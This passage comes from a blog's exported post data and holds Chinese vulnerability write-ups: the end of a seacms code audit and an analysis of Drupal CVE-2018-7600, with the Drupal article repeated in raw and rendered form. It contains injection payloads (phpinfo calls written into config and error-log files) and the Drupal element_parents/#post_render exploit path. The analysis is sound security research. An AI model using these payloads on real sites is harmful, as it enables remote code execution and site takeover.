进行str_replace处理，而$k并没有经过任何过滤，直接拼接到$configstr变量中，也就是说，可以通过POST提交的KEY值传递构造好的payload，该payload将会被写入文件中去，造成远程代码执行</p>\n<p>回头看一下config.cache.inc.php文件<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170748-7efd7696-b760-1.png\" alt=\"17.png\"><br>开发者在写过滤代码时，考虑到程序在处理配置文件经常会出现漏洞:即配置文件中变量值注入的问题</p>\n<p>在以往的此类漏洞中，往往是未对配置文件中变量值进行合理的过滤，导致单引号等特殊字符被写入值部分，从而构造闭合结果导致注入的产生。</p>\n<p>所以，开发者吸取了以往的经验，对写入配置文件中的值部分进行str_replace处理，对”’”与”\\”进行转义。但是，由于这里的变量名同样可控，而且未对变量名进行任何过滤，因此，str_replace处理形同虚设</p>\n<p>使用如下payload，直接注入</p>\n<p>&edit___a;phpinfo();//=1<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170757-840d8928-b760-1.png\" alt=\"18.png\"></p>\n<h3 id=\"3．经过严格的过滤，报错日志文件中却存在利用点\"><a href=\"#3．经过严格的过滤，报错日志文件中却存在利用点\" class=\"headerlink\" title=\"3．经过严格的过滤，报错日志文件中却存在利用点\"></a>3．经过严格的过滤，报错日志文件中却存在利用点</h3><p>漏洞触发点位于\\comment\\api\\index.php<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170805-894f01be-b760-1.png\" alt=\"19.png\"><br>由于seacms采用伪全局变量的形式，$page $id等变量可以从GET请求参数中传递进来</p>\n<p>程序使用is_numeric对$page进行限制，使得$page必须是数字</p>\n<p>上图最下面一行，$h = ReadData($id,$page);</p>\n<p>可见将GET请求传入的$id,$page 传递进ReadDate方法中</p>\n<p>跟入ReadDate方法<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170817-90605778-b760-1.png\" alt=\"20.png\"><br>可见GET请求传入的$id,$page 传递进Readmlist方法中</p>\n<p>跟进Readmlist方法<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170825-94daf88a-b760-1.png\" alt=\"21.png\"><br>在Readmlist方法中的88行，可见存在一处sql语句<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170832-9933cb32-b760-1.png\" alt=\"22.png\"><br>可以看到，该sql语句中拼接了$page变量，而$page变量是由GET请求接收而来，可控</p>\n<p>当我们通过GET请求传递一个负数值的page时(例如-1)，此时执行的sql语句为<br>SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=1 AND v_id=666 ORDER BY id DESC limit -20,10</p>\n<p>该sql语句会导致sql语法错误而报错，如下图<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170841-9e3bb7ac-b760-1.png\" alt=\"23.png\"><br>到此为止，程序仍然是安全的，并不存在sql注入或是代码执行漏洞。但是此cms对报错日志的处理方式，却很有意思：</p>\n<p>当sql语法出现错误时，程序会将报错日志会被写入\\data\\mysqli_error_trace.php<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170851-a44a23d6-b760-1.png\" alt=\"24.png\"><br>跟进mysqli_error_trace.php文件，错误日志的格式如上图：</p>\n<p>错误日志会被<?php ?>包裹</p>\n<p>第一行（第一个红框）为触发错误的url</p>\n<p>第二行（第二个红框）为sql语法错误信息</p>\n<p>因此，当构造payload如下时</p>\n<p>comment/api/index.php?page=-1&amp;gid=666&amp;payload=<em>/phpinfo();/</em></p>\n<p>执行成功后，可见成功写入mysqli_error_trace.php，如下图：<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190805170900-a999b338-b760-1.png\" alt=\"25.png\"><br>访问<a href=\"http://127.0.0.1/seacms/data/mysqli_error_trace.php\">/data/mysqli_error_trace.php</a></p>\n<p>即可执行phpinfo</p>\n<h2 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h2><p>从本次代码审计的结果来看，程序在使用addslashes等过滤方式对输入进行过滤后，仍然产生了两处代码执行，两处sql注入。因此使用addslashes等过滤方式在程序入口处对输入进行过滤并不能代表程序固若金汤。配合程序自身的逻辑，使用恰当的方式进行参数过滤才是最优解。</p>"},{"title":"Drupal远程代码执行漏洞(CVE-2018-7600)分析","date":"2018-04-13T07:38:19.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n近日，流行的开源内容管理框架Drupal曝出一个远程代码执行漏洞，漏洞威胁等级为高危，攻击者可以利用该漏洞执行恶意代码，导致网站完全被控制。漏洞对应的CVE编号为CVE-2018-7600。\n\n本篇文章对Drupal 8 - CVE-2017-7600漏洞进行了详细分析。这个漏洞看起来是一个漏洞，其实我认为，它是由两个小的鸡肋问题组成的。具体是什么呢？\n\n<!--more-->\n\n## **CVE-2018-7600 漏洞分析**\n\n这个漏洞的**根本原因**出在drupal对表单的渲染上：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/图片-1-10.png)\n\n可见，在drupal中，我们不需要直接写html表单，而是先创建一个数组，表单呈现引擎通过位于\\drupal\\core\\lib\\Drupal\\Core\\Form\\FormBuilder.php文件中的buildForm方法构造出一个名为$form表单，然后成对应的html表单进行呈现。\n\n通过下图buildform的定义，可以看出它是用来构造一个表单的\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/2-13.png)\n\n最终的$form是如下图这个样子：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/3-13-743x1024.png)\n\n这个漏洞，恰恰就出在了这里。\n\n但是对于一个drupal框架的应用程序来说，后台表单数组都是开发者写好的，像这个样子\n<pre class=\"lang:default decode:true\">public function form(array $form, FormStateInterface $form_state) {\n$user = $this-&gt;currentUser();\n/** @var \\Drupal\\user\\UserInterface $account */\n$account = $this-&gt;entity;\n$admin = $user-&gt;hasPermission('administer users');\n// Pass access information to the submit handler. Running an access check\n// inside the submit function interferes with form processing and breaks\n// hook_form_alter().\n$form['administer_users'] = [\n'#type' =&gt; 'value',\n'#value' =&gt; $admin,\n];\n\n$form['#attached']['library'][] = 'core/drupal.form';\n\n// For non-admin users, populate the form fields using data from the\n// browser.\nif (!$admin) {\n$form['#attributes']['data-user-info-from-browser'] = TRUE;\n}\n\n// Because the user status has security implications, users are blocked by\n// default when created programmatically and need to be actively activated\n// if needed. When administrators create users from the user interface,\n// however, we assume that they should be created as activated by default.\nif ($admin) {\n$account-&gt;activate();\n}\n\n// Start with the default user account fields.\n$form = parent::form($form, $form_state, $account);\n\nreturn $form;\n}\n</pre>\n攻击者是无法改变表单数组元素的key值的。\n\n很多应用都提供了如下的一个便利的方法：\n\n比如要注册一个用户，用户名、密码、邮箱、电话，这些东西都填好了。当点击提交的时候，网站告诉你，用户名已存在。\n\n这时候，你会发现，密码、邮箱、电话这些元素不需要你再次填写了，页面已经将保存下来了。\n\ndrupal系统同样有这样的功能，具体如何实现的呢？下面我们做个试验：\n\n我们先提交个正常的表单\n\n先在buildform函数返回处下断后\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/4-12.png)\n\n填写表单并提交\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/5-12.png)\n\n页面跳转到注册成功页面，\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/6-12.png)\n\n我们在buildform函数返回处下的断点根本没有断下来。\n\n接着我们再按着上面的表单一模一样的注册一个看看：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/7-9.png)\n\n但这次呢，在断点处成功断下了：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/8-8.png)\n\n在这处断点，我们把name的值改为”kingsguard_test_1”试试\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/9-7.png)\n\n这次的返回页面如下：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/10-7.png)\n\n**整个流程是：**\n\n1.  用户填写表单-&gt;表单没有问题-&gt;返回注册成功页面\n2.  用户填写表单-&gt;表单内容有问题（例如用户名已被注册）-&gt;调用buildform方法，把用户传入的内容一同构造为表单数组-&gt;渲染表单数组为html页面返回\n这就是刚刚在buildform断点处把name值由kingsguard改为kingsguard_test_1，返回的页面里username值也变成kingsguard_test_1的原因。\n\n到这里，攻击链已经很明确了，攻击者传入的值，可以通过buildform（方法构造表单数组，并且这个表单数组接下来还会被drupal表单呈现引擎解析为html页面。\n\n当我们在这个注册表单页面里，如果想上传一张图片\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/11-6.png)\n\n这时候发送的请求如下\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/12-6.png)\n\n当上传成功后，往往有一个缩略图显示在那，如下图菊花处：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/13-5.png)\n\n这个缩略图，是通过drupal\\core\\modules\\file\\src\\Element\\ManagedFile.php文件中的uploadAjaxCallback方法来解析。\n\n注意，还记的上文buildform方法吗？buildform生成$form数组后，将生成的$form数组传递给uploadAjaxCallback方法来解析，目的是在返回页面上显示那个缩率的菊花。\n\n既然流程已经捋顺了，我们通过构造poc来动态调试下，发送如下图post包：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/14-5.png)\n\n首先会进入buildform函数来构造表单数组，接下来这个表单数组($form)会进入uploadAjaxCallback方法。\n\n看下这个uploadAjaxCallback方法：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/15-5.png)\n\n传入uploadAjaxCallback方法中的$form变量，就是buildform方法生成的表单数组：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/16-5.png)\n\n$form数组传入uploadAjaxCallback方法中后,可以看到有这么一行（下图红框处）：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/17-5.png)\n\n$form_parents变量竟然可以从get中传入，意味着这个变量可控,其实就是我们poc中的element_parents=account/mail/%23value。\n\n通过poc，此处的$form_parents变量如下图\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/18-4.png)\n\n$form_parents变量和$form通过NestedArray::getValue方法后，结果值赋给$form\n\n新的form变量如下：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/19-3.png)\n\n接下来看这里的renderRoot方法：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/20-3.png)\n\n此处传入的$form变量为：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/21-3.png)\n\n继续看renderRoot方法：\n\n&nbsp;\n<pre class=\"lang:default decode:true\">public function renderRoot(&amp;$elements) {\n// Disallow calling ::renderRoot() from within another ::renderRoot() call.\nif ($this-&gt;isRenderingRoot) {\n$this-&gt;isRenderingRoot = FALSE;\nthrow new \\LogicException('A stray renderRoot() invocation is causing bubbling of attached assets to break.');\n}\n\n// Render in its own render context.\n$this-&gt;isRenderingRoot = TRUE;\n$output = $this-&gt;executeInRenderContext(new RenderContext(), function () use (&amp;$elements) {\nreturn $this-&gt;render($elements, TRUE);\n});\n$this-&gt;isRenderingRoot = FALSE;\n\nreturn $output;\n}</pre>\n里面调用了render方法\n\n继续看render方法：\n<pre class=\"lang:default decode:true\">public function render(&amp;$elements, $is_root_call = FALSE) {\n// Since #pre_render, #post_render, #lazy_builder callbacks and theme\n// functions or templates may be used for generating a render array's\n// content, and we might be rendering the main content for the page, it is\n// possible that any of them throw an exception that will cause a different\n// page to be rendered (e.g. throwing\n// \\Symfony\\Component\\HttpKernel\\Exception\\NotFoundHttpException will cause\n// the 404 page to be rendered). That page might also use\n// Renderer::renderRoot() but if exceptions aren't caught here, it will be\n// impossible to call Renderer::renderRoot() again.\n// Hence, catch all exceptions, reset the isRenderingRoot property and\n// re-throw exceptions.\ntry {\nreturn $this-&gt;doRender($elements, $is_root_call);\n}\ncatch (\\Exception $e) {\n// Mark the ::rootRender() call finished due to this exception &amp; re-throw.\n$this-&gt;isRenderingRoot = FALSE;\nthrow $e;\n}\n}\n</pre>\n里面调用了doRender方法\n\n继续看doRender方法：\n\n在这个方法的505行\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/22-3.png)\n\n调用call_user_func方法\n\n此处的参数如下：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/23-3.png)\n\n可见，这里的\n\n$callable=”exec”\n\n$elements['#children']=”kingsguard_text”(这里我们传入的恶意代码，这里我就不演示了)\n\n## **总结****:**\n\n这个漏洞看起来是一个漏洞，其实我认为，它是由两个小的鸡肋的问题组成的，第一次就是在buildform处，用户传入的变量没有受到限制，导致可以传入mail[#post_render]、mail[#type]这样的变量，但是单单这个问题，还不严重，因为对于最终渲染的html页面来说，传入的数组仍然是数组，不能被当成元素来解析。但是偏偏uploadAjaxCallback方法中的$form_parents变量是直接通过get('element_parents')得来的，这下两个一结合，$form_parents把之前传入的数值当成元素了，这下就造成了一个大洞。","source":"_posts/cve-2018-7600-analysis.md","raw":"---\ntitle: Drupal远程代码执行漏洞(CVE-2018-7600)分析\ndate: 2018-04-13 15:38:19\ntags: web漏洞分析\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n近日，流行的开源内容管理框架Drupal曝出一个远程代码执行漏洞，漏洞威胁等级为高危，攻击者可以利用该漏洞执行恶意代码，导致网站完全被控制。漏洞对应的CVE编号为CVE-2018-7600。\n\n本篇文章对Drupal 8 - CVE-2017-7600漏洞进行了详细分析。这个漏洞看起来是一个漏洞，其实我认为，它是由两个小的鸡肋问题组成的。具体是什么呢？\n\n<!--more-->\n\n## **CVE-2018-7600 漏洞分析**\n\n这个漏洞的**根本原因**出在drupal对表单的渲染上：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/图片-1-10.png)\n\n可见，在drupal中，我们不需要直接写html表单，而是先创建一个数组，表单呈现引擎通过位于\\drupal\\core\\lib\\Drupal\\Core\\Form\\FormBuilder.php文件中的buildForm方法构造出一个名为$form表单，然后成对应的html表单进行呈现。\n\n通过下图buildform的定义，可以看出它是用来构造一个表单的\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/2-13.png)\n\n最终的$form是如下图这个样子：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/3-13-743x1024.png)\n\n这个漏洞，恰恰就出在了这里。\n\n但是对于一个drupal框架的应用程序来说，后台表单数组都是开发者写好的，像这个样子\n<pre class=\"lang:default decode:true\">public function form(array $form, FormStateInterface $form_state) {\n$user = $this-&gt;currentUser();\n/** @var \\Drupal\\user\\UserInterface $account */\n$account = $this-&gt;entity;\n$admin = $user-&gt;hasPermission('administer users');\n// Pass access information to the submit handler. Running an access check\n// inside the submit function interferes with form processing and breaks\n// hook_form_alter().\n$form['administer_users'] = [\n'#type' =&gt; 'value',\n'#value' =&gt; $admin,\n];\n\n$form['#attached']['library'][] = 'core/drupal.form';\n\n// For non-admin users, populate the form fields using data from the\n// browser.\nif (!$admin) {\n$form['#attributes']['data-user-info-from-browser'] = TRUE;\n}\n\n// Because the user status has security implications, users are blocked by\n// default when created programmatically and need to be actively activated\n// if needed. When administrators create users from the user interface,\n// however, we assume that they should be created as activated by default.\nif ($admin) {\n$account-&gt;activate();\n}\n\n// Start with the default user account fields.\n$form = parent::form($form, $form_state, $account);\n\nreturn $form;\n}\n</pre>\n攻击者是无法改变表单数组元素的key值的。\n\n很多应用都提供了如下的一个便利的方法：\n\n比如要注册一个用户，用户名、密码、邮箱、电话，这些东西都填好了。当点击提交的时候，网站告诉你，用户名已存在。\n\n这时候，你会发现，密码、邮箱、电话这些元素不需要你再次填写了，页面已经将保存下来了。\n\ndrupal系统同样有这样的功能，具体如何实现的呢？下面我们做个试验：\n\n我们先提交个正常的表单\n\n先在buildform函数返回处下断后\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/4-12.png)\n\n填写表单并提交\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/5-12.png)\n\n页面跳转到注册成功页面，\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/6-12.png)\n\n我们在buildform函数返回处下的断点根本没有断下来。\n\n接着我们再按着上面的表单一模一样的注册一个看看：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/7-9.png)\n\n但这次呢，在断点处成功断下了：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/8-8.png)\n\n在这处断点，我们把name的值改为”kingsguard_test_1”试试\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/9-7.png)\n\n这次的返回页面如下：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/10-7.png)\n\n**整个流程是：**\n\n1.  用户填写表单-&gt;表单没有问题-&gt;返回注册成功页面\n2.  用户填写表单-&gt;表单内容有问题（例如用户名已被注册）-&gt;调用buildform方法，把用户传入的内容一同构造为表单数组-&gt;渲染表单数组为html页面返回\n这就是刚刚在buildform断点处把name值由kingsguard改为kingsguard_test_1，返回的页面里username值也变成kingsguard_test_1的原因。\n\n到这里，攻击链已经很明确了，攻击者传入的值，可以通过buildform（方法构造表单数组，并且这个表单数组接下来还会被drupal表单呈现引擎解析为html页面。\n\n当我们在这个注册表单页面里，如果想上传一张图片\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/11-6.png)\n\n这时候发送的请求如下\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/12-6.png)\n\n当上传成功后，往往有一个缩略图显示在那，如下图菊花处：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/13-5.png)\n\n这个缩略图，是通过drupal\\core\\modules\\file\\src\\Element\\ManagedFile.php文件中的uploadAjaxCallback方法来解析。\n\n注意，还记的上文buildform方法吗？buildform生成$form数组后，将生成的$form数组传递给uploadAjaxCallback方法来解析，目的是在返回页面上显示那个缩率的菊花。\n\n既然流程已经捋顺了，我们通过构造poc来动态调试下，发送如下图post包：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/14-5.png)\n\n首先会进入buildform函数来构造表单数组，接下来这个表单数组($form)会进入uploadAjaxCallback方法。\n\n看下这个uploadAjaxCallback方法：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/15-5.png)\n\n传入uploadAjaxCallback方法中的$form变量，就是buildform方法生成的表单数组：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/16-5.png)\n\n$form数组传入uploadAjaxCallback方法中后,可以看到有这么一行（下图红框处）：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/17-5.png)\n\n$form_parents变量竟然可以从get中传入，意味着这个变量可控,其实就是我们poc中的element_parents=account/mail/%23value。\n\n通过poc，此处的$form_parents变量如下图\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/18-4.png)\n\n$form_parents变量和$form通过NestedArray::getValue方法后，结果值赋给$form\n\n新的form变量如下：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/19-3.png)\n\n接下来看这里的renderRoot方法：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/20-3.png)\n\n此处传入的$form变量为：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/21-3.png)\n\n继续看renderRoot方法：\n\n&nbsp;\n<pre class=\"lang:default decode:true\">public function renderRoot(&amp;$elements) {\n// Disallow calling ::renderRoot() from within another ::renderRoot() call.\nif ($this-&gt;isRenderingRoot) {\n$this-&gt;isRenderingRoot = FALSE;\nthrow new \\LogicException('A stray renderRoot() invocation is causing bubbling of attached assets to break.');\n}\n\n// Render in its own render context.\n$this-&gt;isRenderingRoot = TRUE;\n$output = $this-&gt;executeInRenderContext(new RenderContext(), function () use (&amp;$elements) {\nreturn $this-&gt;render($elements, TRUE);\n});\n$this-&gt;isRenderingRoot = FALSE;\n\nreturn $output;\n}</pre>\n里面调用了render方法\n\n继续看render方法：\n<pre class=\"lang:default decode:true\">public function render(&amp;$elements, $is_root_call = FALSE) {\n// Since #pre_render, #post_render, #lazy_builder callbacks and theme\n// functions or templates may be used for generating a render array's\n// content, and we might be rendering the main content for the page, it is\n// possible that any of them throw an exception that will cause a different\n// page to be rendered (e.g. throwing\n// \\Symfony\\Component\\HttpKernel\\Exception\\NotFoundHttpException will cause\n// the 404 page to be rendered). That page might also use\n// Renderer::renderRoot() but if exceptions aren't caught here, it will be\n// impossible to call Renderer::renderRoot() again.\n// Hence, catch all exceptions, reset the isRenderingRoot property and\n// re-throw exceptions.\ntry {\nreturn $this-&gt;doRender($elements, $is_root_call);\n}\ncatch (\\Exception $e) {\n// Mark the ::rootRender() call finished due to this exception &amp; re-throw.\n$this-&gt;isRenderingRoot = FALSE;\nthrow $e;\n}\n}\n</pre>\n里面调用了doRender方法\n\n继续看doRender方法：\n\n在这个方法的505行\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/22-3.png)\n\n调用call_user_func方法\n\n此处的参数如下：\n\n![](http://blog.nsfocus.net/wp-content/uploads/2018/04/23-3.png)\n\n可见，这里的\n\n$callable=”exec”\n\n$elements['#children']=”kingsguard_text”(这里我们传入的恶意代码，这里我就不演示了)\n\n## **总结****:**\n\n这个漏洞看起来是一个漏洞，其实我认为，它是由两个小的鸡肋的问题组成的，第一次就是在buildform处，用户传入的变量没有受到限制，导致可以传入mail[#post_render]、mail[#type]这样的变量，但是单单这个问题，还不严重，因为对于最终渲染的html页面来说，传入的数组仍然是数组，不能被当成元素来解析。但是偏偏uploadAjaxCallback方法中的$form_parents变量是直接通过get('element_parents')得来的，这下两个一结合，$form_parents把之前传入的数值当成元素了，这下就造成了一个大洞。","slug":"cve-2018-7600-analysis","published":1,"updated":"2020-10-27T09:27:09.909Z","_id":"ckgrozu94002rwsa92jz48hyr","comments":1,"layout":"post","photos":[],"link":"","content":"<p>近日，流行的开源内容管理框架Drupal曝出一个远程代码执行漏洞，漏洞威胁等级为高危，攻击者可以利用该漏洞执行恶意代码，导致网站完全被控制。漏洞对应的CVE编号为CVE-2018-7600。</p>\n<p>本篇文章对Drupal 8 - CVE-2017-7600漏洞进行了详细分析。这个漏洞看起来是一个漏洞，其实我认为，它是由两个小的鸡肋问题组成的。具体是什么呢？</p>\n<a id=\"more\"></a>\n\n<h2 id=\"CVE-2018-7600-漏洞分析\"><a href=\"#CVE-2018-7600-漏洞分析\" class=\"headerlink\" title=\"CVE-2018-7600 漏洞分析\"></a><strong>CVE-2018-7600 漏洞分析</strong></h2><p>这个漏洞的<strong>根本原因</strong>出在drupal对表单的渲染上：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/%E5%9B%BE%E7%89%87-1-10.png\"></p>\n<p>可见，在drupal中，我们不需要直接写html表单，而是先创建一个数组，表单呈现引擎通过位于\\drupal\\core\\lib\\Drupal\\Core\\Form\\FormBuilder.php文件中的buildForm方法构造出一个名为$form表单，然后成对应的html表单进行呈现。</p>\n<p>通过下图buildform的定义，可以看出它是用来构造一个表单的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/2-13.png\"></p>\n<p>最终的$form是如下图这个样子：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/3-13-743x1024.png\"></p>\n<p>这个漏洞，恰恰就出在了这里。</p>\n<p>但是对于一个drupal框架的应用程序来说，后台表单数组都是开发者写好的，像这个样子</p>\n<pre class=\"lang:default decode:true\">public function form(array $form, FormStateInterface $form_state) {\n$user = $this-&gt;currentUser();\n/** @var \\Drupal\\user\\UserInterface $account */\n$account = $this-&gt;entity;\n$admin = $user-&gt;hasPermission('administer users');\n// Pass access information to the submit handler. Running an access check\n// inside the submit function interferes with form processing and breaks\n// hook_form_alter().\n$form['administer_users'] = [\n'#type' =&gt; 'value',\n'#value' =&gt; $admin,\n];\n\n$form['#attached']['library'][] = 'core/drupal.form';\n\n// For non-admin users, populate the form fields using data from the\n// browser.\nif (!$admin) {\n$form['#attributes']['data-user-info-from-browser'] = TRUE;\n}\n\n// Because the user status has security implications, users are blocked by\n// default when created programmatically and need to be actively activated\n// if needed. When administrators create users from the user interface,\n// however, we assume that they should be created as activated by default.\nif ($admin) {\n$account-&gt;activate();\n}\n\n// Start with the default user account fields.\n$form = parent::form($form, $form_state, $account);\n\nreturn $form;\n}\n</pre>\n<p>攻击者是无法改变表单数组元素的key值的。</p>\n<p>很多应用都提供了如下的一个便利的方法：</p>\n<p>比如要注册一个用户，用户名、密码、邮箱、电话，这些东西都填好了。当点击提交的时候，网站告诉你，用户名已存在。</p>\n<p>这时候，你会发现，密码、邮箱、电话这些元素不需要你再次填写了，页面已经将保存下来了。</p>\n<p>drupal系统同样有这样的功能，具体如何实现的呢？下面我们做个试验：</p>\n<p>我们先提交个正常的表单</p>\n<p>先在buildform函数返回处下断后</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/4-12.png\"></p>\n<p>填写表单并提交</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/5-12.png\"></p>\n<p>页面跳转到注册成功页面，</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/6-12.png\"></p>\n<p>我们在buildform函数返回处下的断点根本没有断下来。</p>\n<p>接着我们再按着上面的表单一模一样的注册一个看看：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/7-9.png\"></p>\n<p>但这次呢，在断点处成功断下了：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/8-8.png\"></p>\n<p>在这处断点，我们把name的值改为”kingsguard_test_1”试试</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/9-7.png\"></p>\n<p>这次的返回页面如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/10-7.png\"></p>\n<p><strong>整个流程是：</strong></p>\n<ol>\n<li>用户填写表单-&gt;表单没有问题-&gt;返回注册成功页面</li>\n<li>用户填写表单-&gt;表单内容有问题（例如用户名已被注册）-&gt;调用buildform方法，把用户传入的内容一同构造为表单数组-&gt;渲染表单数组为html页面返回<br>这就是刚刚在buildform断点处把name值由kingsguard改为kingsguard_test_1，返回的页面里username值也变成kingsguard_test_1的原因。</li>\n</ol>\n<p>到这里，攻击链已经很明确了，攻击者传入的值，可以通过buildform（方法构造表单数组，并且这个表单数组接下来还会被drupal表单呈现引擎解析为html页面。</p>\n<p>当我们在这个注册表单页面里，如果想上传一张图片</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/11-6.png\"></p>\n<p>这时候发送的请求如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/12-6.png\"></p>\n<p>当上传成功后，往往有一个缩略图显示在那，如下图菊花处：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/13-5.png\"></p>\n<p>这个缩略图，是通过drupal\\core\\modules\\file\\src\\Element\\ManagedFile.php文件中的uploadAjaxCallback方法来解析。</p>\n<p>注意，还记的上文buildform方法吗？buildform生成$form数组后，将生成的$form数组传递给uploadAjaxCallback方法来解析，目的是在返回页面上显示那个缩率的菊花。</p>\n<p>既然流程已经捋顺了，我们通过构造poc来动态调试下，发送如下图post包：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/14-5.png\"></p>\n<p>首先会进入buildform函数来构造表单数组，接下来这个表单数组($form)会进入uploadAjaxCallback方法。</p>\n<p>看下这个uploadAjaxCallback方法：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/15-5.png\"></p>\n<p>传入uploadAjaxCallback方法中的$form变量，就是buildform方法生成的表单数组：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/16-5.png\"></p>\n<p>$form数组传入uploadAjaxCallback方法中后,可以看到有这么一行（下图红框处）：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/17-5.png\"></p>\n<p>$form_parents变量竟然可以从get中传入，意味着这个变量可控,其实就是我们poc中的element_parents=account/mail/%23value。</p>\n<p>通过poc，此处的$form_parents变量如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/18-4.png\"></p>\n<p>$form_parents变量和$form通过NestedArray::getValue方法后，结果值赋给$form</p>\n<p>新的form变量如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/19-3.png\"></p>\n<p>接下来看这里的renderRoot方法：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/20-3.png\"></p>\n<p>此处传入的$form变量为：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2018/04/21-3.png\"></p>\n<p>继续看renderRoot方法：</p>\n<p>&nbsp;</p>\n<pre class=\"lang:default decode:true\">public function renderRoot(&amp;$elements) {\n// Disallow calling ::renderRoot() from within another ::renderRoot() call.\nif ($this-&gt;isRenderingRoot) {\n$this-&gt;isRenderingRoot = FALSE;\nthrow new \\LogicException('A stray renderRoot() invocation is causing bubbling of attached assets to break.');\n}\n\n// Render in its own render context.\n$this-&gt;isRenderingRoot = TRUE;\n$output = 